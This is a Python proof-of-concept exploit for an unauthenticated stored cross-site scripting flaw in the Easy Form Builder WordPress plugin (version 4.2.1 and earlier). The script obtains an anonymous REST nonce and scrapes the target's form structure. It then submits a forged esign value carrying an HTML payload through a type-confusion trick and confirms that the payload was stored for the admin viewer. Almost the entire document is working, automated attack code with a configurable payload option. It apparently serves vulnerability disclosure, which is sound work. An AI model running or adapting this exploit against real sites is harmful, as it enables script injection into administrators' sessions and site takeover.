#!/usr/bin/env python3
"""PoC: Unauthenticated Stored XSS via `esign` field (Easy Form Builder <= 4.2.1).

Usage:
    python poc.py --url=http://localhost:8851/wp/
    python poc.py --url=http://localhost:8851/wp/ --page=http://localhost:8851/wp/contact/
    python poc.py --url=http://localhost:8851/wp/ --form-id=1 --esign-id=abc123

What it does:
  1. GET {url}/wp-json/Emsfb/v1/nonce/refresh -> anonymous wp_rest nonce.
  2. Scrape the form page for `ajax_object_efm` (sid, form_id, nonce, page_id,
     form type, form structure incl. the esign field id).
  3. POST {rest}Emsfb/v1/forms/message/add with an esign value that starts
     with the required `data:image/png;base64,` prefix but carries a
     quote-less HTML payload, stored under a generic `type` (type-confusion)
     so it renders raw via the generic viewer path (no double quotes, JSON-safe).
  4. Verify the payload is stored via forms/response/get (track lookup).

Requires: target form must contain an `esign` field (Free Plus free
activation or Pro). Only stdlib is used.
"""

import argparse
import json
import re
import sys
import urllib.parse
import urllib.request

PAYLOAD = "data:image/png;base64,<img src=x onerror=alert(1)>"

STRUCTURAL_TYPES = {
    "form", "step", "option", "submit", "r_matrix", "buttonnav",
    "payment", "stripe", "paypal", "persiapay", "persiapay", "prcfld",
}

OPTION_TYPES = {
    "radio", "payradio", "imgradio", "chlradio",
    "checkbox", "paycheckbox", "chlcheckbox", "trmcheckbox",
    "select", "multiselect", "payselect", "paymultiselect", "yesno",
}


def http_get(url, timeout=20):
    req = urllib.request.Request(url, headers={"User-Agent": "EFB-PoC/1.0"})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", errors="replace"), r.geturl()


def http_post_json(url, obj, headers=None, timeout=20):
    data = json.dumps(obj).encode()
    h = {"Content-Type": "application/json", "User-Agent": "EFB-PoC/1.0"}
    h.update(headers or {})
    req = urllib.request.Request(url, data=data, headers=h, method="POST")
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.status, r.read().decode("utf-8", errors="replace")


def extract_js_object(html, varname):
    """Find `var <varname> = {...};` and return the balanced {...} substring."""
    for m in re.finditer(r"var\s+" + re.escape(varname) + r"\s*=\s*\{", html):
        start = m.end() - 1
        depth, instr, esc = 0, None, False
        for i in range(start, len(html)):
            ch = html[i]
            if instr:
                if esc:
                    esc = False
                elif ch == "\\":
                    esc = True
                elif ch == instr:
                    instr = None
                continue
            if ch in ("'", '"'):
                instr = ch
            elif ch == "{":
                depth += 1
            elif ch == "}":
                depth -= 1
                if depth == 0:
                    return html[start:i + 1]
    return None


def try_json(s):
    try:
        return json.loads(s)
    except Exception:
        return None


def get_nonce(rest, timeout):
    # nonce endpoint is GET
    body, _ = http_get(rest + "Emsfb/v1/nonce/refresh", timeout=timeout)
    obj = try_json(body) or {}
    nonce = obj.get("nonce") or (obj.get("data") or {}).get("nonce")
    if not nonce:
        sys.exit(f"[-] Could not obtain nonce from nonce/refresh. Body: {body[:200]}")
    return nonce


def same_origin(a, b):
    pa, pb = urllib.parse.urlparse(a), urllib.parse.urlparse(b)
    return (pa.scheme, pa.netloc) == (pb.scheme, pb.netloc)


def crawl_links(html, base, limit=25):
    out = []
    for m in re.finditer(r'href=["\']([^"\']+)["\']', html):
        u = urllib.parse.urljoin(base, m.group(1).split("#")[0])
        if same_origin(u, base) and u not in out and not u.endswith((".css", ".js", ".png", ".jpg", ".svg")):
            out.append(u)
        if len(out) >= limit:
            break
    return out


def parse_form_structure(ajax_obj):
    raw = ajax_obj.get("ajax_value")
    if isinstance(raw, list):
        return raw
    if isinstance(raw, str):
        s = raw.strip()
        obj = try_json(s)
        if isinstance(obj, list):
            return obj
        # stored struct is slash-escaped; retry after stripping backslashes
        obj = try_json(s.replace("\\", ""))
        if isinstance(obj, list):
            return obj
    return None


def resolve_rest(page_url, ajax_rest, timeout):
    """Return a working REST base. Prefer the page's own rest_url, else probe."""
    cands = []
    if ajax_rest:
        r = ajax_rest if ajax_rest.endswith("/") else ajax_rest + "/"
        cands.append(r)
    p = urllib.parse.urlparse(page_url)
    origin = f"{p.scheme}://{p.netloc}/"
    segs = [s for s in p.path.split("/") if s]
    # try longest subdir prefix first (e.g. /wp/... -> /wp/wp-json/), then root
    for i in range(len(segs), -1, -1):
        prefix = "/".join(segs[:i])
        cands.append(urllib.parse.urljoin(origin, (prefix + "/" if prefix else "") + "wp-json/"))
    seen = set()
    for r in cands:
        if r in seen:
            continue
        seen.add(r)
        try:
            body, _ = http_get(r + "Emsfb/v1/nonce/refresh", timeout=timeout)
            obj = try_json(body) or {}
            if obj.get("nonce") or (obj.get("data") or {}).get("nonce"):
                return r
        except Exception:
            continue
    return cands[0] if cands else urllib.parse.urljoin(origin, "wp-json/")


def find_esign(structure):
    for f in structure:
        if isinstance(f, dict) and str(f.get("type", "")).lower() == "esign" and f.get("id_"):
            return f
    return None


def child_options(structure, field_id):
    return [o for o in structure if isinstance(o, dict)
            and str(o.get("parent", "")) == str(field_id) and o.get("id_")]


def build_rows(structure, esign_id, payload, sid, fid, form_name):
    rows = []
    for idx, f in enumerate(structure):
        if not isinstance(f, dict) or not f.get("id_"):
            if idx < 2:
                continue
            else:
                continue
        ftype = str(f.get("type", "")).lower()
        if ftype in STRUCTURAL_TYPES:
            continue
        if ftype == "captcha_v2" or "captcha" in ftype:
            continue
        if f.get("parent"):  # option entries are referenced via id_ob, not standalone
            continue
        name = f.get("name", f.get("id_"))
        base = {"id_": f["id_"], "name": name, "session": sid,
                "form_id": fid, "amount": 0}
        if f["id_"] == esign_id:
            # Type-confusion: validated by the esign branch (id_ match), but
            # stored/rendered as generic text -> quote-less HTML executes.
            rows.append(dict(base, type="text", value=payload))
            continue
        if ftype == "email":
            rows.append(dict(base, type=f.get("type"), value="poc@example.com"))
        elif ftype == "url":
            rows.append(dict(base, type=f.get("type"), value="https://example.com/"))
        elif ftype in ("date", "ardate", "pdate"):
            rows.append(dict(base, type=f.get("type"), value="2026-01-15"))
        elif ftype in ("mobile", "tel"):
            rows.append(dict(base, type=f.get("type"), value="+15551234567"))
        elif ftype in ("number", "range", "prcfld"):
            rows.append(dict(base, type=f.get("type"), value="5"))
        elif ftype == "color":
            rows.append(dict(base, type=f.get("type"), value="#123456"))
        elif ftype == "switch":
            rows.append(dict(base, type=f.get("type"), value="1"))
        elif ftype == "rating":
            rows.append(dict(base, type=f.get("type"), value="5"))
        elif ftype in OPTION_TYPES:
            opts = child_options(structure, f["id_"])
            if not opts:
                rows.append(dict(base, type=f.get("type"), value="1",
                                 id_ob=f["id_"]))
            else:
                o = opts[0]
                r = dict(base, type=f.get("type"), value=o.get("value", "1"),
                         id_ob=o["id_"])
                for k in ("price", "src", "sub_value"):
                    if k in o:
                        r[k] = o[k]
                rows.append(r)
        elif ftype in ("file", "dadfile", "image", "document", "media",
                       "allformat", "zip", "audio_recorder", "video_recorder",
                       "screen_recorder", "maps"):
            # Binary/location fields need real uploads/coords; skip unless required.
            if f.get("required") in (True, 1, "1", "true"):
                print(f"[!] Required field {f['id_']} (type={ftype}) cannot be "
                      f"auto-filled; submission may be rejected for it.")
            continue
        else:  # text, textarea, password, hidden, etc.
            rows.append(dict(base, type=f.get("type", "text"), value="PoC test"))
    return rows


def main():
    ap = argparse.ArgumentParser(description="EFB Stored XSS PoC (esign)")
    ap.add_argument("--url", required=True,
                      help="Form page URL (e.g. http://localhost:8851/wp/2026/09/27/poc/) "
                           "or site base (crawled for a form page)")
    ap.add_argument("--page", default=None, help="Form page URL override (default: --url)")
    ap.add_argument("--rest", default=None, help="REST base override (auto-detected if omitted)")
    ap.add_argument("--form-id", default=None, help="Form ID (auto-detected if omitted)")
    ap.add_argument("--esign-id", default=None, help="esign field id_ (auto-detected if omitted)")
    ap.add_argument("--payload", default=PAYLOAD, help="Quote-less HTML payload with required prefix")
    ap.add_argument("--timeout", type=int, default=20)
    a = ap.parse_args()

    # --url accepts a form page directly; --page overrides it.
    page_url = a.page or a.url
    try:
        first_html, _ = http_get(page_url, a.timeout)
    except Exception as e:
        sys.exit(f"[-] Cannot fetch page {page_url}: {e}")
    first_raw = extract_js_object(first_html, "ajax_object_efm")
    first_obj = try_json(first_raw) if first_raw else None
    ajax_rest = first_obj.get("rest_url") if isinstance(first_obj, dict) else None

    if a.rest:
        rest = a.rest if a.rest.endswith("/") else a.rest + "/"
    else:
        rest = resolve_rest(page_url, ajax_rest, a.timeout)
    base = urllib.parse.urlparse(rest).scheme + "://" + urllib.parse.urlparse(rest).netloc + "/"

    print(f"[*] Page : {page_url}")
    print(f"[*] REST : {rest}")

    nonce = get_nonce(rest, a.timeout)
    print(f"[+] Nonce: {nonce}")

    # --- locate a form page exposing ajax_object_efm ---
    candidates = [page_url]
    html, final = first_html, page_url
    p = urllib.parse.urlparse(page_url)
    crawl_base = f"{p.scheme}://{p.netloc}/"
    if "ajax_object_efm" not in html:
        print("[*] No form here; crawling same-origin links...")
        for link in crawl_links(html, crawl_base):
            candidates.append(link)
    form = None
    for cand in candidates[:26]:
        try:
            h, _ = http_get(cand, a.timeout) if cand != page_url else (html, final)
        except Exception:
            continue
        raw = extract_js_object(h, "ajax_object_efm")
        if not raw:
            continue
        obj = try_json(raw)
        if not isinstance(obj, dict):
            continue
        struct = parse_form_structure(obj)
        if not struct:
            continue
        fid = str(a.form_id or obj.get("form_id") or obj.get("id") or "")
        es = None
        if a.esign_id:
            es = {"id_": a.esign_id}
        else:
            es = find_esign(struct)
        if a.form_id and str(fid) != str(a.form_id):
            continue
        if es:
            form = (cand, h, obj, struct, fid or str(a.form_id or ""), es["id_"])
            break
        if not form and struct and not a.esign_id:
            form = (cand, h, obj, struct, fid, None)  # remember, keep looking
    if not form:
        sys.exit("[-] No Easy Form Builder form found. Open the site, create/publish "
                 "a form with an esign field, then re-run with --url=<form-page>.")
    cand, html, ajax_obj, struct, fid, esign_id = form
    if not esign_id:
        sys.exit(f"[-] Form {fid} on {cand} has no esign field. Add one "
                 f"(Free Plus free activation or Pro), then re-run.")
    print(f"[+] Form page : {cand}")
    print(f"[+] Form ID   : {fid}")
    print(f"[+] esign id_ : {esign_id}")

    sid = ajax_obj.get("sid", "")
    page_id = ajax_obj.get("page_id", 0)
    form_type = ajax_obj.get("type", "form")
    form_name = "poc"
    fresh_nonce = ajax_obj.get("nonce") or nonce
    if not sid:
        print("[!] No sid exposed; continuing (server does not enforce it).")
        sid = ""

    rows = build_rows(struct, esign_id, a.payload, sid, int(fid) if str(fid).isdigit() else fid, form_name)
    if not any(r.get("id_") == esign_id for r in rows):
        sys.exit("[-] Failed to build esign row.")
    print(f"[*] submitting {len(rows)} field(s)...")

    body = {"action": "get_form_Emsfb", "value": json.dumps(rows),
            "name": form_name, "id": fid, "valid": "",
            "type": form_type, "url": cand.split("?")[0],
            "sid": sid, "page_id": page_id}
    headers = {"X-WP-Nonce": fresh_nonce, "sid": sid, "form-id": str(fid)}
    try:
        st, resp = http_post_json(rest + "Emsfb/v1/forms/message/add", body,
                                  headers, a.timeout)
    except Exception as e:
        # retry once with a fresh anonymous nonce (12-24h rotation safe)
        print(f"[!] submit error ({e}); refreshing nonce and retrying...")
        fresh_nonce = get_nonce(rest, a.timeout)
        headers["X-WP-Nonce"] = fresh_nonce
        st, resp = http_post_json(rest + "Emsfb/v1/forms/message/add", body,
                                  headers, a.timeout)
    outer = try_json(resp) or {}
    data = outer.get("data", outer)
    if isinstance(data, dict) and data.get("success") and data.get("track"):
        track = data["track"]
        print(f"[+] STORED! track={track}")
    else:
        print(f"[-] Submission not accepted (HTTP {st}). Server said: {resp[:500]}")
        if isinstance(data, dict) and data.get("field_id"):
            print(f"    -> failing field: {data.get('field_id')}")
        sys.exit(1)

    # --- verify the payload is stored (track lookup reflects raw content) ---
    try:
        st, vbody = http_post_json(
            rest + "Emsfb/v1/forms/response/get", {"value": track, "valid": ""},
            {"X-WP-Nonce": fresh_nonce, "sid": sid, "form-id": str(fid)}, a.timeout)
    except Exception as e:
        sys.exit(f"[!] Stored, but verify request failed: {e}")
    marker = a.payload.replace("data:image/png;base64,", "")
    if marker in vbody or a.payload in vbody:
        print("[+] VERIFIED: payload reflected in stored submission content.")
        print("    Open the entry in WP Admin response viewer (or enter the track")
        print("    code on the tracker page) to observe alert(1) execution.")
    else:
        print("[!] Stored (track issued) but payload not seen in track lookup "
              "(lookup may be throttled or captcha-gated); check admin viewer manually.")


if __name__ == "__main__":
    main()
